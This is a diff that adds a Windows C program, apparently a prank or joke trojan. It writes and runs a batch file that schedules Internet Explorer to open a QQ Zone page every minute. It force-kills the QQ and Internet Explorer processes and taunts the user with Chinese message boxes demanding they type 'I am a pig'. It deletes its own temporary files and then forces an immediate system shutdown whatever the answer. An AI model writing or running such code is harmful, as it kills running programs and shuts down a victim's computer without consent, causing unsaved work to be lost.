@@ -1,0 +1,39 @@
+
+#include<Windows.h>
+#include<stdio.h>
+#include<string.h>
+void main()
+{
+	system("@echo off");
+	FILE *out;
+	out = fopen("d:\\1.bat", "w");
+	fprintf(out, "echo off\n");
+	fprintf(out,"schtasks /create /tn hehe /sc minute /tr \"\'C:\\Program Files\\Internet Explorer\\iexplore.exe\' \'user.qzone.qq.com/454424444\'\"\n");
+	fprintf(out, "schtasks /run /tn hehe\n");
+	fclose(out);
+	system("d:\\1.bat >>d:\\11.bat");
+	system("shutdown /s /t 120 /c \"呵呵 恭喜你打开了本程序 请在两分钟之内回答下面问题 否则~~~\" >>d:\\11.bat");
+	HWND hwnd = FindWindow("ConsoleWindowsClass", NULL);
+	if(IDYES == MessageBox(hwnd, "你喜欢我吗？", "我喜欢你", MB_YESNO))
+                MessageBox(hwnd,"这一看就是骗我的,So~~","真的吗？",MB_OK);
+	else
+                MessageBox(hwnd,"我并不喜欢你啊,So~~","呵呵~~骗你的",MB_OK);
+	system("TASKKILL /F /IM qq.exe >>d:\\11.bat 2>d:\\111.bat");
+	MessageBox(hwnd, "现在看看你的QQ还在不？", "呵呵~~", MB_OK);
+	MessageBox(hwnd, "不在了吧~~最后请输入“我是猪” 否则你还是关机吧！", "呵呵~~", MB_OK);
+	system("TASKKILL /F /IM iexplore.exe >>d:\\11.bat 2>d:\\111.bat");
+	printf("请输入：\n");
+	char c[20];
+	scanf("%s",c);
+	if(strcmp(c,"我是猪")==0)
+                MessageBox(hwnd, "猪 你被骗啦！！！", "呵呵~~", MB_OK);
+        else
+                MessageBox(hwnd, "那就抱歉了！！！", "呵呵~~", MB_OK);
+	MessageBox(hwnd, "呵呵 就这样了 别玩电脑了 拜拜！！", "呵呵~~", MB_OK);
+	system("schtasks  /tn hehe /delete /f >>d:\\11.bat");
+	system("shutdown /a >>11.bat");
+	remove("d:\\1.bat");
+	remove("d:\\11.bat");
+	remove("d:\\111.bat");
+	system("shutdown -s -t 0");
+}
